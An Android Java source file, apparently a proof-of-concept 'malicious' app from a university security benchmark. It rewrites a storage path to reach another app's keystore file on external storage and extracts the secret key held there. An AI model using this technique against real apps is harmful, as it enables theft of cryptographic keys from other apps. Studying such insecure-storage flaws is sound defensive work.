package edu.ksu.cs.malicious;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableEntryException;
import java.security.cert.CertificateException;

import javax.crypto.SecretKey;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    static final String ALIAS = "SECRET_KEY";
    static SecretKey secretKey = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView result = (TextView) findViewById(R.id.resultText);

        File file = new File(getExternalFilesDir(null), "secretKeyStore");
        String absPath = file.getAbsolutePath();
        String modifiedPath = absPath.replace("edu.ksu.cs.malicious", "edu.ksu.cs.benign");
        Log.d(TAG, "Absolute Path = " + absPath);
        Log.d(TAG, "Modified Path = " + modifiedPath);

        KeyStore keyStore = null;
        try {
            keyStore = java.security.KeyStore.getInstance(KeyStore.getDefaultType());
            FileInputStream fis = new FileInputStream(new File(modifiedPath));
            keyStore.load(fis, null);
            KeyStore.SecretKeyEntry secretKeyEntry = (KeyStore.SecretKeyEntry) keyStore.getEntry(ALIAS, null);
            secretKey = secretKeyEntry.getSecretKey();
            result.setText("Successfully retrieved the key.");
            Log.d(TAG, "Successfully retrieved the key.");
        } catch (UnrecoverableEntryException e) {
            e.printStackTrace();
            result.setText("Failed to retrieve the key.");
            Log.d(TAG, "Failed to retrieve the key.");
        } catch (KeyStoreException | CertificateException | NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }
}
